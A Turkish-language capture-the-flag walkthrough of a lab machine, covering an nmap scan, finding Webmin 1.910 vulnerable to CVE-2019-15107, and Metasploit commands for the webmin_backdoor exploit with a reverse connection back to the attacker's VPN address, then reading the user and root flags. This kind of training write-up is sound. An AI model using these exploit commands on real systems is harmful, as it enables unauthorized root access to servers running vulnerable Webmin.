## Keşif ve Tarama

İlk adım olarak hedef sistemin açık portlarını ve çalışan servislerini tespit etmek için **Nmap** kullandık.

<pre>nmap -sV -sC 10.82.183.69</pre>

![Image](https://github.com/user-attachments/assets/0f7ad260-0b01-4739-85b4-fd929f628d23)

---

## Zafiyet Araştırması

Tarama sonuçlarına göre **10000** numaralı portta çalışan **Webmin 1.910** servisini tespit ettik.  
Bu sürümde, **CVE-2019-15107** numaralı kritik bir zafiyet bulunmaktadır.

Bu zafiyet, `password_change.cgi` dosyasında bulunan bir backdoor üzerinden **uzaktan komut çalıştırmaya** imkân tanımaktadır.

![Image](https://github.com/user-attachments/assets/92a40929-d40c-46b2-b851-750e26441a94)

---

## Exploit Uygulaması

Tespit edilen zafiyeti istismar etmek için **Metasploit Framework** kullandık.

![Image](https://github.com/user-attachments/assets/0167489e-e3ba-4536-99fd-46c11b41c9c9)

Aşağıdaki ayarlarla exploit’i çalıştırdık:

<pre>
msfconsole
use exploit/linux/http/webmin_backdoor
set RHOSTS <IP>
set RPORT 10000
set SSL true
set LHOST <VPN_IP_NUMARAN>
set LPORT 10000
exploit
</pre>

Bu adımlar sonucunda Webmin backdoor’una erişim sağladık ve **root yetkileri** elde ettik.

![Image](https://github.com/user-attachments/assets/d6b1372f-23b7-42d0-8e05-b718927f6438)

---

## Sistemdeki Kullanıcıları Bulma

Sisteme eriştikten sonra, mevcut kullanıcıları kontrol ettik.  
Yapılan incelemede **dark** adlı bir kullanıcıya ait flag dosyasını tespit ettik.

<pre>cat /home/dark/user.txt</pre>

![Image](https://github.com/user-attachments/assets/844a52db-af6b-4262-9a64-67538b441518)

---

## Root Flag

Metasploit üzerinden zaten **root yetkilerine** sahip olduğumuz için root flag’ini doğrudan okuyabildik.

<pre>cat /root/root.txt</pre>

![Image](https://github.com/user-attachments/assets/885362ff-9020-4f90-8163-f40b55d63ea8)
